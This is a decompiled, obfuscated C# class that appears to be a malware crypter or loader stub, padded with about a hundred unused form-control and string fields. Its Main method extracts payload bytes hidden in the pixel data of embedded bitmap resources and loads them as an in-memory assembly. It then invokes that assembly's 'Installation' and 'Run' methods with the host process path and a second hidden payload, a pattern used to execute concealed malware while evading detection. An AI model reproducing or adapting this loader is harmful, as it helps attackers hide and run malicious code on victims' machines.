using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class5
{
	private static object object_0;

	private static string string_0;

	private static object object_1;

	private static MethodInfo methodInfo_0;

	private static string string_1;

	private static string string_2;

	private static bool bool_0;

	private static Assembly assembly_0;

	private static byte[] byte_0;

	private static TextBox textBox_0 = new TextBox();

	private static bool bool_1 = true;

	private static Button button_0 = new Button();

	private static string string_3 = "Oj";

	private static TextBox textBox_1 = new TextBox();

	private static bool bool_2 = true;

	private static Button button_1 = new Button();

	private static string string_4 = "MF";

	private static TextBox textBox_2 = new TextBox();

	private static bool bool_3 = true;

	private static Button button_2 = new Button();

	private static string string_5 = "Th";

	private static TextBox textBox_3 = new TextBox();

	private static bool bool_4 = true;

	private static Button button_3 = new Button();

	private static string string_6 = "Sk";

	private static TextBox textBox_4 = new TextBox();

	private static bool bool_5 = true;

	private static Button button_4 = new Button();

	private static string string_7 = "bv";

	private static TextBox textBox_5 = new TextBox();

	private static bool bool_6 = true;

	private static Button button_5 = new Button();

	private static string string_8 = "ph";

	private static TextBox textBox_6 = new TextBox();

	private static bool bool_7 = true;

	private static Button button_6 = new Button();

	private static string string_9 = "ON";

	private static TextBox textBox_7 = new TextBox();

	private static bool bool_8 = true;

	private static Button button_7 = new Button();

	private static string string_10 = "Pg";

	private static TextBox textBox_8 = new TextBox();

	private static bool bool_9 = true;

	private static Button button_8 = new Button();

	private static string string_11 = "DI";

	private static TextBox textBox_9 = new TextBox();

	private static bool bool_10 = true;

	private static Button button_9 = new Button();

	private static string string_12 = "Tv";

	private static TextBox textBox_10 = new TextBox();

	private static bool bool_11 = true;

	private static Button button_10 = new Button();

	private static string string_13 = "uG";

	private static TextBox textBox_11 = new TextBox();

	private static bool bool_12 = true;

	private static Button button_11 = new Button();

	private static string string_14 = "ac";

	private static TextBox textBox_12 = new TextBox();

	private static bool bool_13 = true;

	private static Button button_12 = new Button();

	private static string string_15 = "QG";

	private static TextBox textBox_13 = new TextBox();

	private static bool bool_14 = true;

	private static Button button_13 = new Button();

	private static string string_16 = "wY";

	private static TextBox textBox_14 = new TextBox();

	private static bool bool_15 = true;

	private static Button button_14 = new Button();

	private static string string_17 = "ok";

	private static TextBox textBox_15 = new TextBox();

	private static bool bool_16 = true;

	private static Button button_15 = new Button();

	private static string string_18 = "XX";

	private static TextBox textBox_16 = new TextBox();

	private static bool bool_17 = true;

	private static Button button_16 = new Button();

	private static string string_19 = "aP";

	private static TextBox textBox_17 = new TextBox();

	private static bool bool_18 = true;

	private static Button button_17 = new Button();

	private static string string_20 = "Kj";

	private static TextBox textBox_18 = new TextBox();

	private static bool bool_19 = true;

	private static Button button_18 = new Button();

	private static string string_21 = "SM";

	private static TextBox textBox_19 = new TextBox();

	private static bool bool_20 = true;

	private static Button button_19 = new Button();

	private static string string_22 = "QQ";

	private static TextBox textBox_20 = new TextBox();

	private static bool bool_21 = true;

	private static Button button_20 = new Button();

	private static string string_23 = "na";

	private static TextBox textBox_21 = new TextBox();

	private static bool bool_22 = true;

	private static Button button_21 = new Button();

	private static string string_24 = "nM";

	private static TextBox textBox_22 = new TextBox();

	private static bool bool_23 = true;

	private static Button button_22 = new Button();

	private static string string_25 = "Mr";

	private static TextBox textBox_23 = new TextBox();

	private static bool bool_24 = true;

	private static Button button_23 = new Button();

	private static string string_26 = "bL";

	private static TextBox textBox_24 = new TextBox();

	private static bool bool_25 = true;

	private static Button button_24 = new Button();

	private static string string_27 = "BZ";

	private static TextBox textBox_25 = new TextBox();

	private static bool bool_26 = true;

	private static Button button_25 = new Button();

	private static string string_28 = "Rb";

	private static TextBox textBox_26 = new TextBox();

	private static bool bool_27 = true;

	private static Button button_26 = new Button();

	private static string string_29 = "GW";

	private static TextBox textBox_27 = new TextBox();

	private static bool bool_28 = true;

	private static Button button_27 = new Button();

	private static string string_30 = "YH";

	private static TextBox textBox_28 = new TextBox();

	private static bool bool_29 = true;

	private static Button button_28 = new Button();

	private static string string_31 = "Ok";

	private static TextBox textBox_29 = new TextBox();

	private static bool bool_30 = true;

	private static Button button_29 = new Button();

	private static string string_32 = "vD";

	private static TextBox textBox_30 = new TextBox();

	private static bool bool_31 = true;

	private static Button button_30 = new Button();

	private static string string_33 = "mP";

	private static TextBox textBox_31 = new TextBox();

	private static bool bool_32 = true;

	private static Button button_31 = new Button();

	private static string string_34 = "VD";

	private static TextBox textBox_32 = new TextBox();

	private static bool bool_33 = true;

	private static Button button_32 = new Button();

	private static string string_35 = "bw";

	private static TextBox textBox_33 = new TextBox();

	private static bool bool_34 = true;

	private static Button button_33 = new Button();

	private static string string_36 = "ZS";

	private static TextBox textBox_34 = new TextBox();

	private static bool bool_35 = true;

	private static Button button_34 = new Button();

	private static string string_37 = "gu";

	private static TextBox textBox_35 = new TextBox();

	private static bool bool_36 = true;

	private static Button button_35 = new Button();

	private static string string_38 = "fx";

	private static TextBox textBox_36 = new TextBox();

	private static bool bool_37 = true;

	private static Button button_36 = new Button();

	private static string string_39 = "oJ";

	private static TextBox textBox_37 = new TextBox();

	private static bool bool_38 = true;

	private static Button button_37 = new Button();

	private static string string_40 = "Du";

	private static TextBox textBox_38 = new TextBox();

	private static bool bool_39 = true;

	private static Button button_38 = new Button();

	private static string string_41 = "Xj";

	private static TextBox textBox_39 = new TextBox();

	private static bool bool_40 = true;

	private static Button button_39 = new Button();

	private static string string_42 = "mD";

	private static TextBox textBox_40 = new TextBox();

	private static bool bool_41 = true;

	private static Button button_40 = new Button();

	private static string string_43 = "MR";

	private static TextBox textBox_41 = new TextBox();

	private static bool bool_42 = true;

	private static Button button_41 = new Button();

	private static string string_44 = "cT";

	private static TextBox textBox_42 = new TextBox();

	private static bool bool_43 = true;

	private static Button button_42 = new Button();

	private static string string_45 = "RP";

	private static TextBox textBox_43 = new TextBox();

	private static bool bool_44 = true;

	private static Button button_43 = new Button();

	private static string string_46 = "jy";

	private static TextBox textBox_44 = new TextBox();

	private static bool bool_45 = true;

	private static Button button_44 = new Button();

	private static string string_47 = "Zc";

	private static TextBox textBox_45 = new TextBox();

	private static bool bool_46 = true;

	private static Button button_45 = new Button();

	private static string string_48 = "Gh";

	private static TextBox textBox_46 = new TextBox();

	private static bool bool_47 = true;

	private static Button button_46 = new Button();

	private static string string_49 = "LI";

	private static TextBox textBox_47 = new TextBox();

	private static bool bool_48 = true;

	private static Button button_47 = new Button();

	private static string string_50 = "tu";

	private static TextBox textBox_48 = new TextBox();

	private static bool bool_49 = true;

	private static Button button_48 = new Button();

	private static string string_51 = "mo";

	private static TextBox textBox_49 = new TextBox();

	private static bool bool_50 = true;

	private static Button button_49 = new Button();

	private static string string_52 = "kK";

	private static TextBox textBox_50 = new TextBox();

	private static bool bool_51 = true;

	private static Button button_50 = new Button();

	private static string string_53 = "rm";

	private static TextBox textBox_51 = new TextBox();

	private static bool bool_52 = true;

	private static Button button_51 = new Button();

	private static string string_54 = "qp";

	private static TextBox textBox_52 = new TextBox();

	private static bool bool_53 = true;

	private static Button button_52 = new Button();

	private static string string_55 = "Om";

	private static TextBox textBox_53 = new TextBox();

	private static bool bool_54 = true;

	private static Button button_53 = new Button();

	private static string string_56 = "OY";

	private static TextBox textBox_54 = new TextBox();

	private static bool bool_55 = true;

	private static Button button_54 = new Button();

	private static string string_57 = "mS";

	private static TextBox textBox_55 = new TextBox();

	private static bool bool_56 = true;

	private static Button button_55 = new Button();

	private static string string_58 = "nl";

	private static TextBox textBox_56 = new TextBox();

	private static bool bool_57 = true;

	private static Button button_56 = new Button();

	private static string string_59 = "by";

	private static TextBox textBox_57 = new TextBox();

	private static bool bool_58 = true;

	private static Button button_57 = new Button();

	private static string string_60 = "rB";

	private static TextBox textBox_58 = new TextBox();

	private static bool bool_59 = true;

	private static Button button_58 = new Button();

	private static string string_61 = "Pt";

	private static TextBox textBox_59 = new TextBox();

	private static bool bool_60 = true;

	private static Button button_59 = new Button();

	private static string string_62 = "ud";

	private static TextBox textBox_60 = new TextBox();

	private static bool bool_61 = true;

	private static Button button_60 = new Button();

	private static string string_63 = "lI";

	private static TextBox textBox_61 = new TextBox();

	private static bool bool_62 = true;

	private static Button button_61 = new Button();

	private static string string_64 = "SM";

	private static TextBox textBox_62 = new TextBox();

	private static bool bool_63 = true;

	private static Button button_62 = new Button();

	private static string string_65 = "KY";

	private static TextBox textBox_63 = new TextBox();

	private static bool bool_64 = true;

	private static Button button_63 = new Button();

	private static string string_66 = "rZ";

	private static TextBox textBox_64 = new TextBox();

	private static bool bool_65 = true;

	private static Button button_64 = new Button();

	private static string string_67 = "yU";

	private static TextBox textBox_65 = new TextBox();

	private static bool bool_66 = true;

	private static Button button_65 = new Button();

	private static string string_68 = "io";

	private static TextBox textBox_66 = new TextBox();

	private static bool bool_67 = true;

	private static Button button_66 = new Button();

	private static string string_69 = "ER";

	private static TextBox textBox_67 = new TextBox();

	private static bool bool_68 = true;

	private static Button button_67 = new Button();

	private static string string_70 = "DV";

	private static TextBox textBox_68 = new TextBox();

	private static bool bool_69 = true;

	private static Button button_68 = new Button();

	private static string string_71 = "MS";

	private static TextBox textBox_69 = new TextBox();

	private static bool bool_70 = true;

	private static Button button_69 = new Button();

	private static string string_72 = "ME";

	private static TextBox textBox_70 = new TextBox();

	private static bool bool_71 = true;

	private static Button button_70 = new Button();

	private static string string_73 = "kw";

	private static TextBox textBox_71 = new TextBox();

	private static bool bool_72 = true;

	private static Button button_71 = new Button();

	private static string string_74 = "zQ";

	private static TextBox textBox_72 = new TextBox();

	private static bool bool_73 = true;

	private static Button button_72 = new Button();

	private static string string_75 = "Ze";

	private static TextBox textBox_73 = new TextBox();

	private static bool bool_74 = true;

	private static Button button_73 = new Button();

	private static string string_76 = "aR";

	private static TextBox textBox_74 = new TextBox();

	private static bool bool_75 = true;

	private static Button button_74 = new Button();

	private static string string_77 = "PM";

	private static TextBox textBox_75 = new TextBox();

	private static bool bool_76 = true;

	private static Button button_75 = new Button();

	private static string string_78 = "hw";

	private static TextBox textBox_76 = new TextBox();

	private static bool bool_77 = true;

	private static Button button_76 = new Button();

	private static string string_79 = "Xa";

	private static TextBox textBox_77 = new TextBox();

	private static bool bool_78 = true;

	private static Button button_77 = new Button();

	private static string string_80 = "Ef";

	private static TextBox textBox_78 = new TextBox();

	private static bool bool_79 = true;

	private static Button button_78 = new Button();

	private static string string_81 = "vr";

	private static TextBox textBox_79 = new TextBox();

	private static bool bool_80 = true;

	private static Button button_79 = new Button();

	private static string string_82 = "rs";

	private static TextBox textBox_80 = new TextBox();

	private static bool bool_81 = true;

	private static Button button_80 = new Button();

	private static string string_83 = "km";

	private static TextBox textBox_81 = new TextBox();

	private static bool bool_82 = true;

	private static Button button_81 = new Button();

	private static string string_84 = "hI";

	private static TextBox textBox_82 = new TextBox();

	private static bool bool_83 = true;

	private static Button button_82 = new Button();

	private static string string_85 = "pk";

	private static TextBox textBox_83 = new TextBox();

	private static bool bool_84 = true;

	private static Button button_83 = new Button();

	private static string string_86 = "on";

	private static TextBox textBox_84 = new TextBox();

	private static bool bool_85 = true;

	private static Button button_84 = new Button();

	private static string string_87 = "xk";

	private static TextBox textBox_85 = new TextBox();

	private static bool bool_86 = true;

	private static Button button_85 = new Button();

	private static string string_88 = "IT";

	private static TextBox textBox_86 = new TextBox();

	private static bool bool_87 = true;

	private static Button button_86 = new Button();

	private static string string_89 = "gM";

	private static TextBox textBox_87 = new TextBox();

	private static bool bool_88 = true;

	private static Button button_87 = new Button();

	private static string string_90 = "iS";

	private static TextBox textBox_88 = new TextBox();

	private static bool bool_89 = true;

	private static Button button_88 = new Button();

	private static string string_91 = "It";

	private static TextBox textBox_89 = new TextBox();

	private static bool bool_90 = true;

	private static Button button_89 = new Button();

	private static string string_92 = "mv";

	private static TextBox textBox_90 = new TextBox();

	private static bool bool_91 = true;

	private static Button button_90 = new Button();

	private static string string_93 = "Nr";

	private static TextBox textBox_91 = new TextBox();

	private static bool bool_92 = true;

	private static Button button_91 = new Button();

	private static string string_94 = "sO";

	private static TextBox textBox_92 = new TextBox();

	private static bool bool_93 = true;

	private static Button button_92 = new Button();

	private static string string_95 = "iG";

	private static TextBox textBox_93 = new TextBox();

	private static bool bool_94 = true;

	private static Button button_93 = new Button();

	private static string string_96 = "CK";

	private static TextBox textBox_94 = new TextBox();

	private static bool bool_95 = true;

	private static Button button_94 = new Button();

	private static string string_97 = "HW";

	private static TextBox textBox_95 = new TextBox();

	private static bool bool_96 = true;

	private static Button button_95 = new Button();

	private static string string_98 = "pJ";

	private static TextBox textBox_96 = new TextBox();

	private static bool bool_97 = true;

	private static Button button_96 = new Button();

	private static string string_99 = "wE";

	private static TextBox textBox_97 = new TextBox();

	private static bool bool_98 = true;

	private static Button button_97 = new Button();

	private static string string_100 = "gm";

	private static TextBox textBox_98 = new TextBox();

	private static bool bool_99 = true;

	private static Button button_98 = new Button();

	private static string string_101 = "nC";

	private static TextBox textBox_99 = new TextBox();

	private static bool bool_100 = true;

	private static Button button_99 = new Button();

	private static string string_102 = "mF";

	public static void smethod_0(Bitmap bitmap_0)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		Rectangle rectangle = new Rectangle(0, 0, ((Image)bitmap_0).get_Width(), ((Image)bitmap_0).get_Height());
		BitmapData val = bitmap_0.LockBits(rectangle, (ImageLockMode)1, ((Image)bitmap_0).get_PixelFormat());
		byte[] array = new byte[5];
		Marshal.Copy(val.get_Scan0(), array, 0, 5);
		array = new byte[BitConverter.ToInt32(array, 0) - 1 + 1];
		IntPtr source = new IntPtr(val.get_Scan0().ToInt32() + 5);
		Marshal.Copy(source, array, 0, array.Length);
		bitmap_0.UnlockBits(val);
		smethod_1(array);
	}

	public static void smethod_1(object object_2)
	{
		object_0 = RuntimeHelpers.GetObjectValue(object_2);
	}

	public static void smethod_2()
	{
		string_2 = "Installation";
		smethod_6(assembly_0, new object[1] { smethod_4() });
	}

	public static void smethod_3(string string_103)
	{
		if (File.Exists(string_103))
		{
		}
	}

	public static string smethod_4()
	{
		return Process.GetCurrentProcess().MainModule!.FileName;
	}

	public static void smethod_5(object object_2)
	{
		if (object_1 != null)
		{
			object obj = object_1;
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(object_2) };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall(obj, (Type)null, "Invoke", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				object_2 = RuntimeHelpers.GetObjectValue(array[0]);
			}
		}
	}

	public static void smethod_6(object object_2, object object_3)
	{
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)NewLateBinding.LateGet(object_2, (Type)null, "GetTypes", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
			while (enumerator.MoveNext())
			{
				Type type = (Type)enumerator.Current;
				MethodInfo[] methods = type.GetMethods();
				for (int i = 0; i < methods.Length; i++)
				{
					methodInfo_0 = methods[i];
					string_1 = methodInfo_0.Name;
					if (string_1.Contains(string_2))
					{
						bool_0 = true;
					}
					if (bool_0)
					{
						smethod_5(RuntimeHelpers.GetObjectValue(methodInfo_0.Invoke(null, (object[])object_3)));
						bool_0 = false;
						return;
					}
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public static void smethod_7(Bitmap bitmap_0)
	{
		string_2 = "Run";
		smethod_0(bitmap_0);
		smethod_6(assembly_0, new object[4]
		{
			smethod_4(),
			string.Empty,
			RuntimeHelpers.GetObjectValue(object_0),
			false
		});
	}

	[STAThread]
	public static void Main()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Expected O, but got Unknown
		try
		{
			ResourceManager resourceManager = new ResourceManager("K", smethod_8());
			smethod_9((Bitmap)resourceManager.GetObject("OLiEcieqtIdfoys"));
			assembly_0 = AppDomain.CurrentDomain.Load(byte_0);
			_ = (Bitmap)resourceManager.GetObject("____MtLw____1");
			Bitmap bitmap_ = (Bitmap)resourceManager.GetObject("____MtLw____1");
			smethod_7(bitmap_);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Console.WriteLine("EXCEPTION: " + ex2.ToString());
			Console.ReadLine();
			ProjectData.ClearProjectError();
		}
	}

	public static Assembly smethod_8()
	{
		return Assembly.GetExecutingAssembly();
	}

	public static void smethod_9(Bitmap bitmap_0)
	{
		smethod_0(bitmap_0);
		byte_0 = (byte[])object_0;
	}
}
